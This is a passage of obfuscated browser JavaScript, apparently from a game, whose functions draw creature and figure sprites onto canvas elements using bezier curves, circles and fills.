			Δ.bezierCurveTo(ᐃ * 43.00567626953125, 111.44320678710938 * ᐃ, ᐃ * 40.00567626953125, 111.44320678710938 * ᐃ, 37.00567626953125 * ᐃ, 110.44320678710938 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 39.50567626953125, 104.94320678710938 * ᐃ, ᐃ * 39.50567626953125, ᐃ * 104.94320678710938, 42.00567626953125 * ᐃ, 99.44320678710938 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 33.00567626953125, ᐃ * 99.44320678710938, ᐃ * 33.00567626953125, 98.44320678710938 * ᐃ, ᐃ * 33.00567626953125, ᐃ * 96.44320678710938);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ΔⵠΔⵠ], Ⲇᐃ[2], ᐃ * 3);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠᐃⲆΔ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(60.00567626953125 * ᐃ, ᐃ * 99.35227966308594);
			Δ.bezierCurveTo(70.00567626953125 * ᐃ, 82.35227966308594 * ᐃ, 85.00567626953125 * ᐃ, ᐃ * 86.35227966308594, ᐃ * 87.00567626953125, 97.35227966308594 * ᐃ);
			Δ.bezierCurveTo(89.00567626953125 * ᐃ, 101.35227966308594 * ᐃ, 88.00567626953125 * ᐃ, ᐃ * 105.35227966308594, ᐃ * 87.00567626953125, ᐃ * 110.35227966308594);
			Δ.bezierCurveTo(ᐃ * 89.00567626953125, ᐃ * 111.35227966308594, 91.00567626953125 * ᐃ, ᐃ * 112.35227966308594, 93.00567626953125 * ᐃ, ᐃ * 115.35227966308594);
			Δ.bezierCurveTo(ᐃ * 96.00567626953125, 111.35227966308594 * ᐃ, ᐃ * 99.00567626953125, ᐃ * 111.35227966308594, ᐃ * 100.00567626953125, 110.35227966308594 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 98.00567626953125, 92.35227966308594 * ᐃ, ᐃ * 103.00567626953125, 86.35227966308594 * ᐃ, 113.00567626953125 * ᐃ, 89.35227966308594 * ᐃ);
			Δ.bezierCurveTo(122.00567626953125 * ᐃ, ᐃ * 92.35227966308594, 123.00567626953125 * ᐃ, ᐃ * 94.35227966308594, ᐃ * 126.00567626953125, 98.35227966308594 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 124.00567626953125, 102.35227966308594 * ᐃ, ᐃ * 123.00567626953125, 103.35227966308594 * ᐃ, ᐃ * 121.00567626953125, ᐃ * 104.35227966308594);
			Δ.bezierCurveTo(ᐃ * 124.00567626953125, 105.35227966308594 * ᐃ, 126.00567626953125 * ᐃ, 107.35227966308594 * ᐃ, 129.00567626953125 * ᐃ, 111.35227966308594 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 115.00567626953125, ᐃ * 122.35227966308594, ᐃ * 113.00567626953125, ᐃ * 145.35227966308594, 100.00567626953125 * ᐃ, ᐃ * 152.35227966308594);
			Δ.bezierCurveTo(91.00567626953125 * ᐃ, ᐃ * 158.35227966308594, 83.00567626953125 * ᐃ, 149.35227966308594 * ᐃ, ᐃ * 76.00567626953125, 138.35227966308594 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 67.00567626953125, ᐃ * 114.35227966308594, 63.00567626953125 * ᐃ, 113.35227966308594 * ᐃ, ᐃ * 59.00567626953125, ᐃ * 111.35227966308594);
			Δ.bezierCurveTo(ᐃ * 62.00567626953125, 107.35227966308594 * ᐃ, 64.00567626953125 * ᐃ, ᐃ * 105.35227966308594, 66.00567626953125 * ᐃ, 104.35227966308594 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 63.00567626953125, 100.35227966308594 * ᐃ, ᐃ * 62.00567626953125, 100.35227966308594 * ᐃ, 60.00567626953125 * ᐃ, 99.35227966308594 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[3]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 33.00567626953125, ᐃ * 95.44320678710938);
			Δ.bezierCurveTo(42.00567626953125 * ᐃ, 87.44320678710938 * ᐃ, ᐃ * 48.00567626953125, ᐃ * 51.443206787109375, 74.00567626953125 * ᐃ, 47.443206787109375 * ᐃ);
			Δ.bezierCurveTo(100.00567626953125 * ᐃ, ᐃ * 42.443206787109375, ᐃ * 118.00567626953125, 49.443206787109375 * ᐃ, ᐃ * 131.00567626953125, 55.443206787109375 * ᐃ);
			Δ.bezierCurveTo(140.00567626953125 * ᐃ, 70.44320678710938 * ᐃ, 145.00567626953125 * ᐃ, 87.44320678710938 * ᐃ, ᐃ * 152.00567626953125, ᐃ * 94.44320678710938);
			Δ.bezierCurveTo(149.00567626953125 * ᐃ, 99.44320678710938 * ᐃ, ᐃ * 147.00567626953125, ᐃ * 98.44320678710938, 141.00567626953125 * ᐃ, ᐃ * 101.44320678710938);
			Δ.bezierCurveTo(147.00567626953125 * ᐃ, ᐃ * 108.44320678710938, ᐃ * 147.00567626953125, 111.44320678710938 * ᐃ, ᐃ * 147.00567626953125, ᐃ * 112.44320678710938);
			Δ.bezierCurveTo(ᐃ * 143.00567626953125, 112.44320678710938 * ᐃ, ᐃ * 141.00567626953125, 112.44320678710938 * ᐃ, 137.00567626953125 * ᐃ, 111.44320678710938 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 138.00567626953125, ᐃ * 117.44320678710938, ᐃ * 138.00567626953125, 120.44320678710938 * ᐃ, 138.00567626953125 * ᐃ, 124.44320678710938 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 125.00567626953125, 107.44320678710938 * ᐃ, ᐃ * 121.00567626953125, ᐃ * 124.44320678710938, 110.00567626953125 * ᐃ, 141.44320678710938 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 102.00567626953125, 158.44320678710938 * ᐃ, ᐃ * 89.00567626953125, ᐃ * 158.44320678710938, ᐃ * 80.00567626953125, ᐃ * 144.44320678710938);
			Δ.bezierCurveTo(ᐃ * 61.00567626953125, 111.44320678710938 * ᐃ, 56.00567626953125 * ᐃ, ᐃ * 117.44320678710938, 48.00567626953125 * ᐃ, ᐃ * 120.44320678710938);
			Δ.bezierCurveTo(ᐃ * 46.00567626953125, ᐃ * 118.44320678710938, ᐃ * 47.00567626953125, ᐃ * 112.44320678710938, 48.00567626953125 * ᐃ, ᐃ * 107.44320678710938);
			Δ.bezierCurveTo(43.00567626953125 * ᐃ, 111.44320678710938 * ᐃ, ᐃ * 40.00567626953125, ᐃ * 111.44320678710938, ᐃ * 37.00567626953125, 110.44320678710938 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 39.50567626953125, ᐃ * 104.94320678710938, 39.50567626953125 * ᐃ, 104.94320678710938 * ᐃ, ᐃ * 42.00567626953125, 99.44320678710938 * ᐃ);
			Δ.bezierCurveTo(33.00567626953125 * ᐃ, 99.44320678710938 * ᐃ, 33.00567626953125 * ᐃ, 98.44320678710938 * ᐃ, ᐃ * 33.00567626953125, 96.44320678710938 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, ᐃᐃⵠᐃᐃ, Ⲇᐃ[Δᐃⵠⵠ], ᐃ * ΔⲆΔᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ⵠⵠᐃⵠ];
			Δ.moveTo(51.00567626953125 * ᐃ, ᐃ * 72.53409576416016);
			Δ.bezierCurveTo(48.00567626953125 * ᐃ, 56.534095764160156 * ᐃ, ᐃ * 48.00567626953125, ᐃ * 49.534095764160156, ᐃ * 54.00567626953125, ᐃ * 35.534095764160156);
			Δ.bezierCurveTo(58.00567626953125 * ᐃ, 26.534095764160156 * ᐃ, 65.00567626953125 * ᐃ, 27.534095764160156 * ᐃ, 73.00567626953125 * ᐃ, ᐃ * 40.534095764160156);
			Δ.bezierCurveTo(ᐃ * 81.00567626953125, ᐃ * 49.534095764160156, 82.00567626953125 * ᐃ, ᐃ * 50.534095764160156, ᐃ * 83.00567626953125, ᐃ * 51.534095764160156);
			ΔⲆ(Δ, Ⲇᐃ[1], Ⲇᐃ[ᐃⲆⵠᐃ], 3 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 105.00567626953125, 50.53410339355469 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 112.00567626953125, 48.53410339355469 * ᐃ, ᐃ * 125.00567626953125, 21.534103393554688 * ᐃ, ᐃ * 132.00567626953125, 33.53410339355469 * ᐃ);
			Δ.bezierCurveTo(138.00567626953125 * ᐃ, 42.53410339355469 * ᐃ, 140.00567626953125 * ᐃ, 64.53410339355469 * ᐃ, 136.00567626953125 * ᐃ, 75.53410339355469 * ᐃ);
			ΔⲆ(Δ, Ⲇᐃ[1], Ⲇᐃ[Δᐃⵠⵠ], 3 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ΔⵠⲆⲆ];
			Δ.lineJoin = ⵠ[ⵠᐃΔⲆ];
			Δ.moveTo(57.00567626953125 * ᐃ, 68.53410339355469 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 63.00567626953125, ᐃ * 69.53410339355469, 69.00567626953125 * ᐃ, ᐃ * 66.53410339355469, 73.00567626953125 * ᐃ, ᐃ * 60.53410339355469);
			Δ.bezierCurveTo(ᐃ * 66.00567626953125, ᐃ * 47.53410339355469, 61.00567626953125 * ᐃ, 42.53410339355469 * ᐃ, 58.00567626953125 * ᐃ, ᐃ * 49.53410339355469);
			Δ.bezierCurveTo(56.00567626953125 * ᐃ, 59.53410339355469 * ᐃ, 56.00567626953125 * ᐃ, ᐃ * 64.53410339355469, 57.00567626953125 * ᐃ, 67.53410339355469 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⵠⵠⵠᐃ]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ⵠⵠΔΔ];
			Δ.moveTo(115.00567626953125 * ᐃ, ᐃ * 59.715911865234375);
			Δ.bezierCurveTo(119.00567626953125 * ᐃ, ᐃ * 48.715911865234375, ᐃ * 126.00567626953125, 41.715911865234375 * ᐃ, 129.00567626953125 * ᐃ, 48.715911865234375 * ᐃ);
			Δ.bezierCurveTo(131.00567626953125 * ᐃ, 56.715911865234375 * ᐃ, 133.00567626953125 * ᐃ, ᐃ * 71.71591186523438, 127.00567626953125 * ᐃ, ᐃ * 68.71591186523438);
			Δ.bezierCurveTo(120.00567626953125 * ᐃ, ᐃ * 67.71591186523438, ᐃ * 114.00567626953125, ᐃ * 59.715911865234375, 116.00567626953125 * ᐃ, ᐃ * 58.715911865234375);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[3]);
			ⵠᐃᐃ(Δ, ᐃ * 77, ᐃ * 107, ᐃ * 6);
			ΔⲆ(Δ, Ⲇᐃ[ⲆᐃᐃⲆ]);
			ⵠᐃᐃ(Δ, 110 * ᐃ, ᐃ * 107, ᐃ * Δⵠᐃᐃⵠ);
			ΔⲆ(Δ, Ⲇᐃ[Δᐃⵠⵠ]);
			ⵠᐃᐃ(Δ, 75 * ᐃ, ᐃ * 105, 3 * ᐃ);
			ΔⲆ(Δ, Ⲇᐃ[4]);
			ⵠᐃᐃ(Δ, ᐃ * 108, ᐃ * 105, ᐃ * ᐃⲆᐃᐃ);
			ΔⲆ(Δ, Ⲇᐃ[ⲆⲆⲆΔ]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(88.00567626953125 * ᐃ, 141.4431915283203 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 93.00567626953125, 137.4431915283203 * ᐃ, ᐃ * 96.00567626953125, ᐃ * 138.4431915283203, 100.00567626953125 * ᐃ, 141.4431915283203 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 103.00567626953125, 143.4431915283203 * ᐃ, 101.00567626953125 * ᐃ, ᐃ * 149.4431915283203, 95.00567626953125 * ᐃ, 148.4431915283203 * ᐃ);
			Δ.bezierCurveTo(85.00567626953125 * ᐃ, ᐃ * 148.4431915283203, ᐃ * 86.00567626953125, 145.4431915283203 * ᐃ, ᐃ * 88.00567626953125, ᐃ * 142.4431915283203);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ᐃᐃⵠ]);
			return Ⲇⵠ
		}

		function ΔⲆΔⲆΔΔⲆ(ᐃ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = ᐃ * 238;
			Ⲇⵠ.height = ᐃ * 230;
			Δ.translate(-93 * ᐃ, -110 * ᐃ + ᐃ * 5);
			Δ.globalAlpha = .3;
			ⵠᐃᐃ(Δ, 213.5 * ᐃ, 256.75 * ᐃ, 75 * ᐃ);
			ΔⲆ(Δ, Ⲇᐃ[5]);
			ⵠᐃᐃ(Δ, ᐃ * 213.5, 175.75 * ᐃ, ᐃ * 25);
			ΔⲆ(Δ, Ⲇᐃ[ᐃⲆⵠⵠ]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⲆΔΔᐃ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(156.5 * ᐃ, ᐃ * 137.75);
			Δ.bezierCurveTo(170.5 * ᐃ, 173.75 * ᐃ, 195.5 * ᐃ, ᐃ * 177.75, 209.5 * ᐃ, ᐃ * 177.75);
			Δ.lineWidth = ᐃ * 17;
			Δ.strokeStyle = Ⲇᐃ[ⵠⲆⵠⵠ];
			Δ.stroke();
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 217.5, ᐃ * 178.75);
			Δ.bezierCurveTo(251.5 * ᐃ, ᐃ * 177.75, ᐃ * 263.5, 153.75 * ᐃ, ᐃ * 270.5, 140.75 * ᐃ);
			Δ.lineWidth = ⵠⵠᐃΔΔ * ᐃ;
			Δ.strokeStyle = Ⲇᐃ[ΔⵠⲆⲆ];
			Δ.stroke();
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠⲆⵠⵠ];
			Δ.lineJoin = ⵠ[ΔⵠⲆⲆ];
			Δ.moveTo(130.5 * ᐃ, ᐃ * 124.75);
			Δ.bezierCurveTo(153.5 * ᐃ, ᐃ * 185.75, ᐃ * 198.5, ᐃ * 185.75, ᐃ * 213.5, 185.75 * ᐃ);
			Δ.lineWidth = ᐃ * 17;
			Δ.strokeStyle = Ⲇᐃ[ΔⲆΔΔ];
			Δ.stroke();
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ΔΔᐃⲆ];
			Δ.moveTo(214.5 * ᐃ, 183.75 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 265.5, 192.75 * ᐃ, 293.5 * ᐃ, 141.75 * ᐃ, 297.5 * ᐃ, ᐃ * 124.75);
			Δ.lineWidth = 17 * ᐃ;
			Δ.strokeStyle = Ⲇᐃ[ᐃΔΔⲆ];
			Δ.stroke();
			Δ.beginPath();
			Δ.lineCap = ⵠ[ΔᐃΔⲆ];
			Δ.lineJoin = ⵠ[ⵠⵠᐃⵠ];
			Δ.moveTo(107.5 * ᐃ, ᐃ * 213.75);
			Δ.bezierCurveTo(151.5 * ᐃ, ᐃ * 190.75, 198.5 * ᐃ, ᐃ * 184.75, ᐃ * 210.5, ᐃ * 184.75);
			Δ.lineWidth = ᐃ * 17;
			Δ.strokeStyle = Ⲇᐃ[5];
			Δ.stroke();
			Δ.beginPath();
			Δ.lineCap = ⵠ[ᐃⲆⵠⵠ];
			Δ.lineJoin = ⵠ[ᐃΔΔⲆ];
			Δ.moveTo(ᐃ * 212.5, 187.75 * ᐃ);
			Δ.bezierCurveTo(258.5 * ᐃ, 182.75 * ᐃ, 286.5 * ᐃ, ᐃ * 194.75, 314.5 * ᐃ, ᐃ * 206.75);
			Δ.lineWidth = ⵠᐃᐃΔᐃ * ᐃ;
			Δ.strokeStyle = Ⲇᐃ[ⵠⲆᐃᐃ];
			Δ.stroke();
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⲆⲆΔⵠ];
			Δ.lineJoin = ⵠ[ΔⲆΔΔ];
			Δ.moveTo(102.5 * ᐃ, ᐃ * 258.75);
			Δ.bezierCurveTo(ᐃ * 142.5, 200.75 * ᐃ, 193.5 * ᐃ, 194.75 * ᐃ, 211.5 * ᐃ, 185.75 * ᐃ);
			Δ.lineWidth = 17 * ᐃ;
			Δ.strokeStyle = Ⲇᐃ[5];
			Δ.stroke();
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 214.5, 192.75 * ᐃ);
			Δ.bezierCurveTo(276.5 * ᐃ, 194.75 * ᐃ, 306.5 * ᐃ, 233.75 * ᐃ, 316.5 * ᐃ, 246.75 * ᐃ);
			Δ.lineWidth = 17 * ᐃ;
			Δ.strokeStyle = Ⲇᐃ[5];
			Δ.stroke();
			Δ.translate(ⲆΔⵠ, -ΔᐃΔⲆ);
			Δ.globalAlpha = 1;
			ⵠᐃᐃ(Δ, 213.5 * ᐃ, ᐃ * 256.75, 75 * ᐃ);
			ΔⲆ(Δ, Ⲇᐃ[3]);
			ⵠᐃᐃ(Δ, ᐃ * 213.5, 175.75 * ᐃ, ᐃ * 25);
			ΔⲆ(Δ, Ⲇᐃ[ⲆⲆΔⲆ]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(219.5 * ᐃ, 158.75 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 226.5, ᐃ * 159.75, ᐃ * 227.5, 147.75 * ᐃ, 219.5 * ᐃ, ᐃ * 145.75);
			Δ.closePath();
			Δ.lineWidth = ⲆⲆᐃΔΔ * ᐃ;
			Δ.strokeStyle = Ⲇᐃ[3];
			Δ.stroke();
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 210.5, 160.75 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 203.5, ᐃ * 159.75, ᐃ * 199.5, 146.75 * ᐃ, 210.5 * ᐃ, ᐃ * 145.75);
			Δ.closePath();
			Δ.lineWidth = ᐃ * ⲆⵠΔΔᐃ;
			Δ.strokeStyle = Ⲇᐃ[Δⵠᐃⵠ];
			Δ.stroke();
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠᐃⲆΔ];
			Δ.lineJoin = ⵠ[ⵠᐃΔⲆ];
			Δ.moveTo(ᐃ * 219.5, ᐃ * 158.75);
			Δ.bezierCurveTo(226.5 * ᐃ, ᐃ * 159.75, 227.5 * ᐃ, ᐃ * 147.75, 219.5 * ᐃ, ᐃ * 145.75);
			Δ.closePath();
			Δ.fillStyle = Ⲇᐃ[0];
			Δ.fill();
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⲆΔⲆᐃ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(210.5 * ᐃ, 160.75 * ᐃ);
			Δ.bezierCurveTo(203.5 * ᐃ, ᐃ * 159.75, 199.5 * ᐃ, 146.75 * ᐃ, ᐃ * 210.5, ᐃ * 145.75);
			Δ.closePath();
			Δ.fillStyle = Ⲇᐃ[0];
			Δ.fill();
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ⵠⵠᐃⵠ];
			Δ.moveTo(ᐃ * 156.5, ᐃ * 137.75);
			Δ.bezierCurveTo(ᐃ * 170.5, ᐃ * 173.75, 195.5 * ᐃ, ᐃ * 177.75, ᐃ * 209.5, 177.75 * ᐃ);
			Δ.lineWidth = ⵠᐃⵠⲆⲆ * ᐃ;
			Δ.strokeStyle = Ⲇᐃ[3];
			Δ.stroke();
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ᐃⲆⵠⵠ];
			Δ.moveTo(217.5 * ᐃ, ᐃ * 178.75);
			Δ.bezierCurveTo(ᐃ * 251.5, 177.75 * ᐃ, ᐃ * 263.5, 153.75 * ᐃ, 270.5 * ᐃ, 140.75 * ᐃ);
			Δ.lineWidth = ᐃ * ⵠᐃᐃΔᐃ;
			Δ.strokeStyle = Ⲇᐃ[ⲆΔⵠⵠ];
			Δ.stroke();
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ᐃᐃⲆᐃ];
			Δ.moveTo(ᐃ * 130.5, 124.75 * ᐃ);
			Δ.bezierCurveTo(153.5 * ᐃ, ᐃ * 185.75, ᐃ * 198.5, 185.75 * ᐃ, 213.5 * ᐃ, 185.75 * ᐃ);
			Δ.lineWidth = ᐃ * ⵠⵠᐃΔΔ;
			Δ.strokeStyle = Ⲇᐃ[3];
			Δ.stroke();
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ᐃΔΔⲆ];
			Δ.moveTo(214.5 * ᐃ, ᐃ * 183.75);
			Δ.bezierCurveTo(265.5 * ᐃ, ᐃ * 192.75, ᐃ * 293.5, ᐃ * 141.75, 297.5 * ᐃ, 124.75 * ᐃ);
			Δ.lineWidth = ᐃᐃⲆⵠΔΔᐃ * ᐃ;
			Δ.strokeStyle = Ⲇᐃ[ᐃⲆᐃᐃ];
			Δ.stroke();
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠⵠΔΔ];
			Δ.lineJoin = ⵠ[ΔΔᐃⲆ];
			Δ.moveTo(ᐃ * 107.5, 213.75 * ᐃ);
			Δ.bezierCurveTo(151.5 * ᐃ, ᐃ * 190.75, 198.5 * ᐃ, ᐃ * 184.75, ᐃ * 210.5, 184.75 * ᐃ);
			Δ.lineWidth = ᐃ * 17;
			Δ.strokeStyle = Ⲇᐃ[Δⵠᐃⵠ];
			Δ.stroke();
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 212.5, ᐃ * 187.75);
			Δ.bezierCurveTo(ᐃ * 258.5, ᐃ * 182.75, ᐃ * 286.5, 194.75 * ᐃ, 314.5 * ᐃ, ᐃ * 206.75);
			Δ.lineWidth = 17 * ᐃ;
			Δ.strokeStyle = Ⲇᐃ[3];
			Δ.stroke();
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠⵠᐃⵠ];
			Δ.lineJoin = ⵠ[ⲆΔΔᐃ];
			Δ.moveTo(ᐃ * 102.5, 258.75 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 142.5, ᐃ * 200.75, ᐃ * 193.5, 194.75 * ᐃ, ᐃ * 211.5, ᐃ * 185.75);
			Δ.lineWidth = ΔΔΔⲆⲆⲆᐃ * ᐃ;
			Δ.strokeStyle = Ⲇᐃ[ⲆΔⵠⵠ];
			Δ.stroke();
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ᐃⲆⵠΔ];
			Δ.moveTo(ᐃ * 214.5, 192.75 * ᐃ);
			Δ.bezierCurveTo(276.5 * ᐃ, 194.75 * ᐃ, 306.5 * ᐃ, ᐃ * 233.75, ᐃ * 316.5, 246.75 * ᐃ);
			Δ.lineWidth = ᐃ * ⵠᐃⲆⲆⵠΔΔ;
			Δ.strokeStyle = Ⲇᐃ[ΔΔᐃΔ];
			Δ.stroke();
			Δ.beginPath();
			Δ.lineCap = ⵠ[ΔⲆΔΔ];
			Δ.lineJoin = ⵠ[ᐃⲆⵠΔ];
			Δ.moveTo(156.5 * ᐃ, 137.75 * ᐃ);
			Δ.bezierCurveTo(170.5 * ᐃ, 173.75 * ᐃ, ᐃ * 195.5, ᐃ * 177.75, ᐃ * 209.5, ᐃ * 177.75);
			Δ.lineWidth = ᐃ * 8;
			Δ.strokeStyle = Ⲇᐃ[Ⲇᐃⵠⵠ];
			Δ.stroke();
			Δ.beginPath();
			Δ.lineCap = ⵠ[ΔΔᐃⲆ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 217.5, 178.75 * ᐃ);
			Δ.bezierCurveTo(251.5 * ᐃ, ᐃ * 177.75, 263.5 * ᐃ, 153.75 * ᐃ, 270.5 * ᐃ, ᐃ * 140.75);
			Δ.lineWidth = ᐃ * ⵠⵠⲆⵠΔ;
			Δ.strokeStyle = Ⲇᐃ[0];
			Δ.stroke();
			Δ.beginPath();
			Δ.lineCap = ⵠ[ᐃΔΔΔ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(130.5 * ᐃ, ᐃ * 124.75);
			Δ.bezierCurveTo(ᐃ * 153.5, ᐃ * 185.75, ᐃ * 198.5, 185.75 * ᐃ, ᐃ * 213.5, 185.75 * ᐃ);
			Δ.lineWidth = ⲆⵠⵠⲆΔ * ᐃ;
			Δ.strokeStyle = Ⲇᐃ[ΔᐃΔΔ];
			Δ.stroke();
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ⵠⵠΔⵠ];
			Δ.moveTo(ᐃ * 214.5, ᐃ * 183.75);
			Δ.bezierCurveTo(265.5 * ᐃ, ᐃ * 192.75, 293.5 * ᐃ, 141.75 * ᐃ, ᐃ * 297.5, 124.75 * ᐃ);
			Δ.lineWidth = ΔᐃᐃⲆᐃ * ᐃ;
			Δ.strokeStyle = Ⲇᐃ[ΔⲆⵠⲆ];
			Δ.stroke();
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ΔᐃΔⲆ];
			Δ.moveTo(ᐃ * 107.5, 213.75 * ᐃ);
			Δ.bezierCurveTo(151.5 * ᐃ, 190.75 * ᐃ, 198.5 * ᐃ, 184.75 * ᐃ, 210.5 * ᐃ, ᐃ * 184.75);
			Δ.lineWidth = ⲆᐃΔⲆⵠ * ᐃ;
			Δ.strokeStyle = Ⲇᐃ[0];
			Δ.stroke();
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(212.5 * ᐃ, ᐃ * 187.75);
			Δ.bezierCurveTo(ᐃ * 258.5, ᐃ * 182.75, ᐃ * 286.5, 194.75 * ᐃ, ᐃ * 314.5, ᐃ * 206.75);
			Δ.lineWidth = 8 * ᐃ;
			Δ.strokeStyle = Ⲇᐃ[0];
			Δ.stroke();
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ΔΔᐃⲆ];
			Δ.moveTo(ᐃ * 102.5, 258.75 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 142.5, ᐃ * 200.75, ᐃ * 193.5, 194.75 * ᐃ, 211.5 * ᐃ, ᐃ * 185.75);
			Δ.lineWidth = ᐃ * ⲆⲆᐃᐃⲆ;
			Δ.strokeStyle = Ⲇᐃ[ΔᐃΔΔ];
			Δ.stroke();
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ⵠᐃΔⵠ];
			Δ.moveTo(214.5 * ᐃ, ᐃ * 192.75);
			Δ.bezierCurveTo(ᐃ * 276.5, ᐃ * 194.75, ᐃ * 306.5, ᐃ * 233.75, 316.5 * ᐃ, ᐃ * 246.75);
			Δ.lineWidth = ᐃⵠⲆᐃᐃ * ᐃ;
			Δ.strokeStyle = Ⲇᐃ[0];
			Δ.stroke();
			ⵠᐃᐃ(Δ, ᐃ * 213.5, ᐃ * 256.75, ᐃ * 70);
			ΔⲆ(Δ, Ⲇᐃ[ⵠⲆⲆ]);
			ⵠᐃᐃ(Δ, ᐃ * 213.5, ᐃ * 175.75, 20 * ᐃ);
			ΔⲆ(Δ, Ⲇᐃ[0]);
			ⵠᐃᐃ(Δ, 222 * ᐃ, 166 * ᐃ, 5 * ᐃ);
			Δ.fillStyle = Ⲇᐃ[Δⵠⵠⵠ];
			Δ.fill();
			ⵠᐃᐃ(Δ, 205 * ᐃ, ᐃ * 166, ᐃⲆⵠⵠ * ᐃ);
			Δ.fillStyle = Ⲇᐃ[Δⵠⵠⵠ];
			Δ.fill();
			ⵠᐃᐃ(Δ, ᐃ * 206.2, ᐃ * 167, ᐃ * 2.5);
			Δ.fillStyle = Ⲇᐃ[4];
			Δ.fill();
			ⵠᐃᐃ(Δ, 223.2 * ᐃ, ᐃ * 167, ᐃ * 2.5);
			Δ.fillStyle = Ⲇᐃ[4];
			Δ.fill();
			Δ.save();
			Δ.translate(ᐃ * 213.5, ᐃ * 293.75);
			Δ.rotate(.76);
			Ⲇᐃᐃ(Δ, -22 * ᐃ, -21 * ᐃ, ᐃ * 44, 42 * ᐃ, ᐃ * ᐃⲆⲆⲆ);
			Δ.restore();
			Δ.fillStyle = Ⲇᐃ[ⵠⲆΔ];
			Δ.fill();
			Δ.save();
			Δ.translate(ᐃ * 212.5, 258.25 * ᐃ);
			Δ.rotate(.8);
			Ⲇᐃᐃ(Δ, -ⲆΔΔⵠⲆ * ᐃ, ᐃ * -14.5, ᐃ * 30, ᐃ * 29, ᐃ * 6);
			Δ.restore();
			Δ.fillStyle = Ⲇᐃ[1];
			Δ.fill();
			return Ⲇⵠ
		}

		function ⵠᐃⵠⵠⲆⲆⲆ(ᐃ, ᐃΔⲆΔ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			var ᐃⵠⵠ = ᐃ * 125;
			var ⵠⵠᐃ = 95 * ᐃ;
			var w2 = ᐃⵠⵠ / 2;
			var ΔΔⵠⲆᐃ = ⵠⵠᐃ / 2;
